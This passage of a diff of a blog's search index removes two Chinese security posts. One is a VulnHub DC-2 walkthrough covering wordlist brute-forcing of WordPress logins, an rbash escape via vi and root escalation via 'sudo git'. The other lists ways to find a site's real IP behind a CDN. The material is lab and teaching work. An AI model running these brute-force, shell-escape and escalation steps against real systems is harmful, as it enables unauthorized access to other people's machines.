-<p><strong>知识点：WordPress、受限shell、git提权</strong></p>
-<blockquote>
-<p>kali：192.168.101.10<br>
-靶机和kali处于同一局域网</p>
-</blockquote>
-<h2 id="0x01-信息收集">0x01 信息收集</h2>
-<ol>
-<li>探测目标地址</li>
-</ol>
-<p>命令：<code>arp-scan -l</code> 或者 <code>nmap -sP 192.168.101.0/24</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708153613.png" alt=""></p>
-<p>靶机地址为192.168.101.17</p>
-<ol start="2">
-<li>探测目标开放端口</li>
-</ol>
-<p>命令：<code>nmap -sV -p- 192.168.101.17</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154210.png" alt=""></p>
-<p>靶机开放了80端口和7744端口，7744为SSH，先访问下80</p>
-<blockquote>
-<p>ts：需要先修改hosts文件，kali上的hosts位置在 /etc/hosts</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154819.png" alt=""></p>
-<h2 id="0x02-Flag1">0x02 Flag1</h2>
-<p>访问成功，使用wappalyzer查看下网站所使用的技术</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708155044.png" alt=""></p>
-<p>网站为 WordPress CMS构建，并且发现第一个flag</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708154934.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag 1:</span><br><span class="line"></span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure>
-<p>提示使用cewl工具，并且只有登陆之后才能看到下一个flag</p>
-<h2 id="0x03-Flag2">0x03 Flag2</h2>
-<p>cewl工具可以根据url来生成对应的密码字典<br>
-命令：<code>cewl -w /root/dic/dc2_passwd.txt http://dc-2/</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161432.png" alt=""></p>
-<p>有了密码，接下来使用wpscan，它可以查询出wordpress的用户名，-e u是枚举用户名，默认从1-10<br>
-命令：<code>wpscan --url http://dc-2/ -e u</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708161924.png" alt=""></p>
-<p>接下来，找出 WordPress 登陆地址，可以网上查找或者工具去扫描<br>
-工具可以用dirb，命令：<code>dirb http://dc-2/</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708162403.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708165933.png" alt=""></p>
-<p>字典地址都具备了，使用wpscan进行爆破<br>
-命令：<code>wpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171549.png" alt=""></p>
-<p>爆破成功，结果如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: jerry, Password: adipiscing</span><br><span class="line"> | Username: tom, Password: parturient</span><br></pre></td></tr></table></figure>
-<p>使用 jerry 登陆，找到了flag2</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708171905.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#39;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>
-<p>意思是，WordPress行不通就换个方式</p>
-<h2 id="0x04-Flag3">0x04 Flag3</h2>
-<p>于是想到之前还有个SSH服务，便尝试登陆，发现jerry无法登录，tom可以</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172252.png" alt=""><br>
-<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172433.png" alt=""></p>
-<p><code>ls</code> 发现 <code>flag3.txt</code> 在当前目录下，但是使用 <code>cat</code> 却提示 <code>-rbash: cat: command not found</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708172620.png" alt=""></p>
-<p>这是一个受限shell环境，常见的受限shell环境类型包括rbash、rksh和rsh，于是现在需要绕过rbash，<code>compgen</code>还能使用，查看下当前可以执行的命令<br>
-命令：<code>compgen -c</code></p>
-<blockquote>
-<p>受限shell是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现&gt; 了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。</p>
-</blockquote>
-<p>大概清楚了，查看当前环境变量：<code>echo $PATH</code>，发现位于<code>/home/tom/usr/bin</code>下，用<code>vi</code>转义受限制的shell：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
-<p>然后设置环境变量：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATH</span><br><span class="line">export SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708173847.png" alt=""></p>
-<p>成功绕过rbash，并读取了flag3.txt的内容</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>
-<p>实际上，是要让我们切换 jerry 用户</p>
-<h2 id="0x05-Flag4">0x05 Flag4</h2>
-<p>使用<code>su jerry</code>切换 jerry 用户，回到jerry的家目录查看，发现了flag4</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708174603.png" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Good to see that you&#39;ve made it this far - but you&#39;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#39;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>
-<p>告诉我们只差最后一个flag了，还提示了 <code>git</code></p>
-<h2 id="0x06-Flag5">0x06 Flag5</h2>
-<p>其实是使用<code>git</code>进行提权</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200708175605.png" alt=""></p>
-<p>拿到最后的 flag .</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SqlMap代理池</title>
     <url>/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
     <content><![CDATA[<h2 id="获取代理池">获取代理池</h2>
@@ -953,65 +1012,6 @@ Cadmus Computer Systems 表示Virtualbox虚拟机<br>
       </categories>
       <tags>
         <tag>Sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>绕过CDN寻找真实IP</title>
-    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
-    <content><![CDATA[<blockquote>
-<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
-</blockquote>
-<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
-<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
-<h2 id="二、子域名">二、子域名</h2>
-<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
-常用的子域名查找方法和工具：</p>
-<ol>
-<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
-<li>在线查询网站：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>子域名爆破工具</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
-<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
-<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
-<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
-<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
-<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
-<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
-SSL证书搜索引擎：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
-<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
-<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
-国外多PING测试工具：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
-<h2 id="七、全网扫描">七、全网扫描</h2>
-<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
-<ol>
-<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
-<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
-<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
-<ul>
-<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com" target="_blank" rel="noopener">我们常常将www.test.com</a> 和 <a href="http://test.com" target="_blank" rel="noopener">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com" target="_blank" rel="noopener">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com" target="_blank" rel="noopener">通过访问test.com</a>，就可以绕过 CDN 了。</li>
-<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
       </tags>
   </entry>
   <entry>
